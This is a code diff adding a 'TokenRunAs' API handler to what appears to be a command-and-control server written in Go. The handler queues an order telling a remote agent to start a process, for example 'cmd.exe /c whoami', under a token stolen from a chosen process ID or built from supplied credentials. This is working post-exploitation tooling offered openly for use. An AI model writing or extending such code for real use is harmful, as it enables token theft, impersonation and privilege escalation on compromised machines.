@@ -251,3 +251,57 @@ func (h *Handlers) TokenRevert(c *gin.Context) {
 	h.server.Logger.LogCommandExecution(agentID, "TOKEN_REVERT", "", true)
 	h.APIResponse(c, true, "Token revert queued", map[string]interface{}{"command_id": cmd.ID}, "")
 }
+
+// TokenRunAs spawns a process under a stolen or created token.
+// POST /api/v1/agent/:id/token/runas
+// Body: { "exe": "cmd.exe", "args": "/c whoami", "pid": 0, "user": "", "domain": "", "pass": "" }
+// Either pid (steal token) or user+pass (make token) must be provided.
+func (h *Handlers) TokenRunAs(c *gin.Context) {
+	agentID := c.Param("id")
+	agent, exists := h.server.Monitor.GetAgent(agentID)
+	if !exists {
+		c.Status(http.StatusNotFound)
+		h.APIResponse(c, false, "", nil, "Agent not found")
+		return
+	}
+	if agent.Status == services.StatusOffline {
+		c.Status(http.StatusBadRequest)
+		h.APIResponse(c, false, "", nil, "Agent is offline")
+		return
+	}
+
+	var req struct {
+		Exe    string `json:"exe"`
+		Args   string `json:"args"`
+		PID    uint32 `json:"pid"`
+		User   string `json:"user"`
+		Domain string `json:"domain"`
+		Pass   string `json:"pass"`
+	}
+	if err := c.ShouldBindJSON(&req); err != nil || req.Exe == "" {
+		c.Status(http.StatusBadRequest)
+		h.APIResponse(c, false, "", nil, "exe is required")
+		return
+	}
+
+	cmd := &types.Command{
+		ID:            uuid.New().String(),
+		AgentID:       agentID,
+		OperationType: "token_runas",
+		TokenExe:      req.Exe,
+		Command:       req.Args,
+		TokenPID:      req.PID,
+		TokenUser:     req.User,
+		TokenDomain:   req.Domain,
+		TokenPass:     req.Pass,
+		CreatedAt:     time.Now(),
+		Status:        "pending",
+		Timeout:       30,
+	}
+	h.server.CommandQueue.Add(agentID, cmd)
+	h.server.Logger.LogCommandExecution(agentID, "TOKEN_RUNAS", req.Exe, true)
+	h.APIResponse(c, true, "Token runas queued", map[string]interface{}{
+		"command_id": cmd.ID,
+		"exe":        req.Exe,
+	}, "")
+}
